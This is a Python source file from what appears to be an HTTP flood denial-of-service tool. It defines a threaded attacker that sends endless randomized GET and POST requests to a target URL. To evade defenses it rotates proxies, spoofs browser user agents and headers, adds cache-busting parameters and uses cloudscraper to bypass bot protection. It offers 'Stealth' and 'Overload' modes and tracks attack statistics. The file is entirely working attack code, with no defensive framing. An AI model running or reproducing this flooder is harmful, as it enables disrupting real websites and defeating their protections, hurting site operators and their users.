import threading
import random
import time
from urllib.parse import urlparse

import cloudscraper

import config
from utils.network import get_random_proxy, get_random_user_agent

class HTTPFlood(threading.Thread):
    def __init__(self, target_url, mode):
        super().__init__()
        self.daemon = True
        self.target_url = target_url
        self.mode = mode
        self.scraper = cloudscraper.create_scraper(
            browser={'browser': 'chrome', 'platform': 'windows', 'mobile': False}
        )
        self.parsed_target = urlparse(target_url)

    def get_attack_params(self):
        delay = 0
        if self.mode == "Stealth":
            delay = random.uniform(0.5, 2.0)
        elif self.mode == "Overload":
            delay = random.uniform(0, 0.1)
        return delay

    def build_headers(self):
        headers = {
            'User-Agent': get_random_user_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Referer': f"{self.parsed_target.scheme}://{self.parsed_target.netloc}/"
        }
        return headers
        
    def run(self):
        config.attack_stats["active_threads"] += 1
        delay = self.get_attack_params()
        
        while not config.stop_event.is_set():
            proxy = get_random_proxy()
            headers = self.build_headers()
            
            # Cache-busting query
            url_with_cache_bust = f"{self.target_url}?_={int(time.time() * 1000)}"

            try:
                # Randomly choose between GET and POST
                if random.choice([True, False]):
                    response = self.scraper.get(url_with_cache_bust, headers=headers, proxies=proxy, timeout=config.PROXY_TIMEOUT)
                else:
                    response = self.scraper.post(url_with_cache_bust, headers=headers, proxies=proxy, timeout=config.PROXY_TIMEOUT, data={"data": "A"*20})
                
                config.attack_stats["requests_sent"] += 1
                if response.status_code >= 400:
                    config.attack_stats["errors"] += 1
                
                request_size = len(response.request.method) + len(response.request.url) + len('\r\n'.join(f'{k}: {v}' for k, v in response.request.headers.items()))
                config.attack_stats["bytes_sent"] += request_size

            except Exception:
                config.attack_stats["errors"] += 1
            
            if delay > 0:
                time.sleep(delay)
        
        config.attack_stats["active_threads"] -= 1

